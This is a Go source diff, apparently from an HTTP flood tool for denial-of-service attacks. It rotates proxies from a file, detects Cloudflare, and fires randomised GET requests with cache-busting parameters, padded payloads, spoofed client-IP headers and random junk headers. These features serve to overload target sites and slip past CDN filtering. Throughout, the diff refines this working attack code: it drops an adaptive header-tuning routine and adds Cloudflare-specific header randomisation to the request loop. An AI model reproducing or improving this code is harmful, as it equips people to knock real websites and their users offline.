@@ -98,12 +98,6 @@ type Capabilities struct {
 	IfRange bool
 }
 
-type TuningResult struct {
-	Headers         map[string]string
-	PayloadSize     int
-	TotalHeaderSize int
-}
-
 var cdnType string
 
 func init() {
@@ -378,175 +372,6 @@ func Detect_Max_Total_Header_Size(target string) int {
 	return lastSuccess
 }
 
-func AdaptiveHeaderTuning(target string, caps Capabilities, maxTotalHeader int, maxPayload int, cdnType string, proxyIP string) TuningResult {
-	baseHeaders := map[string]string{
-		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
-		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		"Accept-Language":           "en-US,en;q=0.9",
-		"Accept-Encoding":           "gzip, deflate, br",
-		"Connection":                "keep-alive",
-		"Cache-Control":             "no-cache, no-store, must-revalidate",
-		"Pragma":                    "no-cache",
-		"Upgrade-Insecure-Requests": "1",
-		"If-Modified-Since":         ifModifiedSince,
-	}
-
-	type HeaderCandidate struct {
-		Name     string
-		BaseValue string
-		Sizes    []int
-		Priority int
-	}
-	candidates := []HeaderCandidate{
-		{Name: "X-Cache-Buster", BaseValue: "", Sizes: []int{0}, Priority: 2},
-		{Name: "X-Forwarded-For", BaseValue: proxyIP, Sizes: []int{0}, Priority: 2},
-		{Name: "X-Real-IP", BaseValue: proxyIP, Sizes: []int{0}, Priority: 2},
-		{Name: "Range", BaseValue: "bytes=0-", Sizes: []int{1000, 5000, 10000}, Priority: 3},
-		{Name: "Referer", BaseValue: "https://www.google.com/search?q=", Sizes: []int{100, 500, 1000}, Priority: 3},
-		{Name: "X-Large-Data", BaseValue: "", Sizes: []int{512, 1024, 2048, 4096}, Priority: 3},
-		{Name: "Cookie", BaseValue: "big=", Sizes: []int{512, 1024, 2048}, Priority: 3},
-	}
-
-	if cdnType == "cloudflare" {
-		cfHeaders := []HeaderCandidate{
-			{Name: "CF-Connecting-IP", BaseValue: proxyIP, Sizes: []int{0}, Priority: 2},
-			{Name: "CDN-Loop", BaseValue: "cloudflare", Sizes: []int{0}, Priority: 2},
-			{Name: "X-Original-URL", BaseValue: "/", Sizes: []int{8, 16, 32}, Priority: 2},
-			{Name: "X-Forwarded-Host", BaseValue: "example.com", Sizes: []int{0}, Priority: 2},
-			{Name: "X-Request-ID", BaseValue: "", Sizes: []int{8, 16}, Priority: 2},
-		}
-		candidates = append(candidates, cfHeaders...)
-	}
-
-	finalHeaders := make(map[string]string)
-	for k, v := range baseHeaders {
-		finalHeaders[k] = v
-	}
-
-	testHeaders := func(headers map[string]string, payloadSize int) bool {
-		client := &http.Client{
-			Timeout: 5 * time.Second,
-			Transport: &http.Transport{
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			},
-		}
-		url := target
-		if payloadSize > 0 {
-			if strings.Contains(url, "?") {
-				url += "&big=" + strings.Repeat("x", payloadSize)
-			} else {
-				url += "?big=" + strings.Repeat("x", payloadSize)
-			}
-		}
-		req, _ := http.NewRequest("GET", url, nil)
-		for k, v := range headers {
-			req.Header.Set(k, v)
-		}
-		resp, err := client.Do(req)
-		if err != nil {
-			return false
-		}
-		defer resp.Body.Close()
-		code := resp.StatusCode
-		if code >= 200 && code < 400 {
-			return true
-		}
-		if code == 413 || code == 431 || code == 400 {
-			return false
-		}
-		return true
-	}
-
-	calcTotalSize := func(h map[string]string) int {
-		total := 0
-		for k, v := range h {
-			total += len(k) + len(v) + 4
-		}
-		return total
-	}
-
-	bestPayload := 0
-	if maxPayload > 0 {
-		for _, size := range []int{maxPayload, maxPayload / 2, maxPayload / 4, maxPayload / 8} {
-			if size <= 0 {
-				continue
-			}
-			if testHeaders(finalHeaders, size) {
-				bestPayload = size
-				break
-			}
-		}
-	}
-
-	for _, cand := range candidates {
-		if _, exists := finalHeaders[cand.Name]; exists {
-			continue
-		}
-		for _, size := range cand.Sizes {
-			var value string
-			if size == 0 {
-				value = cand.BaseValue
-			} else {
-				if strings.Contains(cand.BaseValue, "=") {
-					value = cand.BaseValue + strings.Repeat("x", size)
-				} else if cand.Name == "Range" {
-					value = fmt.Sprintf("bytes=0-%d", size)
-				} else if cand.Name == "Referer" {
-					value = cand.BaseValue + strings.Repeat("x", size)
-				} else if cand.Name == "X-Large-Data" {
-					value = strings.Repeat("x", size)
-				} else {
-					value = cand.BaseValue + strings.Repeat("x", size)
-				}
-			}
-			testHeadersCopy := make(map[string]string)
-			for k, v := range finalHeaders {
-				testHeadersCopy[k] = v
-			}
-			testHeadersCopy[cand.Name] = value
-
-			if maxTotalHeader > 0 && calcTotalSize(testHeadersCopy) > maxTotalHeader {
-				continue
-			}
-
-			if testHeaders(testHeadersCopy, bestPayload) {
-				finalHeaders[cand.Name] = value
-				break
-			}
-		}
-	}
-
-	totalSize := calcTotalSize(finalHeaders)
-	if maxTotalHeader > 0 && totalSize > maxTotalHeader {
-		priorityOrder := []string{"X-Large-Data", "Range", "Cookie", "Referer", "X-Forwarded-For", "X-Real-IP", "X-Cache-Buster"}
-		for _, name := range priorityOrder {
-			if _, ok := finalHeaders[name]; ok {
-				delete(finalHeaders, name)
-				totalSize = calcTotalSize(finalHeaders)
-				if totalSize <= maxTotalHeader {
-					break
-				}
-			}
-		}
-	}
-
-	for maxTotalHeader > 0 && calcTotalSize(finalHeaders) > maxTotalHeader && len(finalHeaders) > 10 {
-		for k := range finalHeaders {
-			if _, required := baseHeaders[k]; required {
-				continue
-			}
-			delete(finalHeaders, k)
-			break
-		}
-	}
-
-	return TuningResult{
-		Headers:         finalHeaders,
-		PayloadSize:     bestPayload,
-		TotalHeaderSize: calcTotalSize(finalHeaders),
-	}
-}
-
 func main() {
 	log.SetOutput(io.Discard)
 
@@ -570,6 +395,7 @@ func main() {
 	host := parsed.Hostname()
 
 	cdnType = DetectCDN(tgt)
+	fmt.Printf("[INFO] Detected CDN: %s\n", cdnType)
 
 	var proxies []*url.URL
 	file, err := os.Open("proxy.txt")
@@ -602,8 +428,6 @@ func main() {
 	maxHeader := Detect_Header_Support(tgt)
 	caps := Detect_Headers_Costum(tgt, proxyIP)
 	maxTotalHeader := Detect_Max_Total_Header_Size(tgt)
-
-	tuningResult := AdaptiveHeaderTuning(tgt, caps, maxTotalHeader, maxPayload, cdnType, proxyIP)
 
 	wcs := make([]CLI, len(proxies))
 	for i, proxyURL := range proxies {
@@ -701,8 +525,8 @@ func main() {
 							reqURL += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
 						}
 
-						if tuningResult.PayloadSize > 0 && subRng.Intn(3) == 0 {
-							size := tuningResult.PayloadSize/2 + subRng.Intn(tuningResult.PayloadSize/2)
+						if maxPayload > 0 && subRng.Intn(3) == 0 {
+							size := maxPayload/2 + subRng.Intn(maxPayload/2)
 							if size < 1 {
 								size = 64
 							}
@@ -716,18 +540,87 @@ func main() {
 						req, _ := http.NewRequest("GET", reqURL, nil)
 
 						headerMap := make(map[string]string)
-						for k, v := range tuningResult.Headers {
-							headerMap[k] = v
-						}
 
 						headerMap["User-Agent"] = prof.UA
 						headerMap["Accept"] = prof.Accept
 						headerMap["Accept-Language"] = prof.Lang
 						headerMap["Accept-Encoding"] = prof.Encoding
+						headerMap["Connection"] = "keep-alive"
+						headerMap["Cache-Control"] = "no-cache, no-store, must-revalidate"
+						headerMap["Pragma"] = "no-cache"
+						headerMap["Upgrade-Insecure-Requests"] = "1"
+						headerMap["If-Modified-Since"] = ifModifiedSince
 						headerMap["X-Cache-Buster"] = strconv.FormatInt(subRng.Int63(), 16)
 
-						if strings.Contains(headerMap["Referer"], "?") {
-							headerMap["Referer"] = headerMap["Referer"] + "&" + RST(subRng, 8) + "=" + RST(subRng, 8)
+						if cdnType == "cloudflare" {
+							if caps.Headers["X-Original-URL"] && subRng.Intn(3) == 0 {
+								headerMap["X-Original-URL"] = "/" + strconv.FormatInt(subRng.Int63(), 16)
+							}
+							if caps.Headers["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
+								headerMap["X-Forwarded-Host"] = strconv.FormatInt(subRng.Int63(), 16) + ".example.com"
+							}
+							if caps.Headers["X-Request-ID"] && subRng.Intn(3) == 0 {
+								headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
+							}
+							if caps.Headers["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
+								headerMap["CF-Connecting-IP"] = cli.ip
+							}
+							if caps.Headers["True-Client-IP"] && subRng.Intn(5) == 0 {
+								headerMap["True-Client-IP"] = cli.ip
+							}
+							if caps.Headers["CDN-Loop"] && subRng.Intn(5) == 0 {
+								headerMap["CDN-Loop"] = "cloudflare"
+							}
+							for h, supported := range caps.Headers {
+								if !supported {
+									continue
+								}
+								if subRng.Intn(3) != 0 {
+									continue
+								}
+								switch h {
+								case "X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop", "CF-Connecting-IP", "True-Client-IP":
+									continue
+								case "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
+									headerMap[h] = cli.ip
+								case "X-Forwarded-Proto":
+									headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
+								case "X-Forwarded-Port":
+									headerMap[h] = strconv.Itoa(80 + subRng.Intn(100))
+								case "X-Forwarded-Scheme":
+									headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
+								case "X-Requested-With":
+									headerMap[h] = "XMLHttpRequest"
+								case "Accept-Charset":
+									headerMap[h] = "utf-8, iso-8859-1;q=0.5"
+								case "Accept-Datetime":
+									headerMap[h] = time.Now().Add(-time.Duration(subRng.Intn(3600)) * time.Second).Format(time.RFC1123)
+								case "From":
+									headerMap[h] = RST(subRng, 8) + "@example.com"
+								case "Max-Forwards":
+									headerMap[h] = strconv.Itoa(1 + subRng.Intn(10))
+								case "Via":
+									headerMap[h] = fmt.Sprintf("1.1 proxy-%d.example.com", subRng.Intn(100))
+								case "Warning":
+									headerMap[h] = fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10))
+								case "DNT":
+									headerMap[h] = "1"
+								case "Upgrade":
+									headerMap[h] = "websocket"
+								case "Save-Data":
+									headerMap[h] = "on"
+								case "X-HTTP-Method-Override":
+									headerMap[h] = []string{"PUT", "DELETE", "PATCH"}[subRng.Intn(3)]
+								case "X-Cache":
+									headerMap[h] = []string{"MISS", "HIT", "EXPIRED"}[subRng.Intn(3)]
+								default:
+								}
+							}
+						}
+
+						if subRng.Intn(2) == 0 {
+							randHeader := "X-" + RST(subRng, 8)
+							headerMap[randHeader] = RST(subRng, 16)
 						}
 
 						if subRng.Intn(4) == 0 {
